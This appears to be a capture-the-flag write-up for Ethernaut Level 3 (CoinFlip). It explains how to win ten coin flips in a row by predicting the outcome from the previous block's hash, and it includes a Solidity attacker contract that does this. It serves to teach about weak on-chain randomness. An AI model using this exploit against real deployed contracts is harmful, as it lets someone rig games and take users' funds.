# 03_CoinFlip Project

## Challenge: Ethernaut CTF Level 3 - CoinFlip

 - **Victory condition**: Guess the coin flip correctly 10 times in a row, making the value of `consecutiveWins` equal to 10
 - **Knowledge required**: Solidity global variables, block hash values, Chainlink VRF, Solidity interfaces and type casting and techniques for calling external contract functions

## Solution Strategy:

1. First deploy the CoinFlipExtensions contract to experience the values of `block.number` and `blockhash()`
2. Design an attack contract that can call functions of the CoinFlip contract, because this will make the `block.number` and `blockhash()` values the same for both contracts (executed within the same block)
3. In the attack contract, based on the result calculated from the block hash, predict heads or tails, and call CoinFlip's `flip()` with the result as a parameter
4. In JavaScript, repeatedly call the attack contract to attack 10 times

## Solidity Technique Supplement: About calling external contracts from within contracts

```solidity
contract CoinFlipAttacker {
    ICoinFlip public target;
    //......

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

1. Write an interface defining the functions of the external contract you want to call
2. Cast the contract address you want to call to that interface type
3. Call the function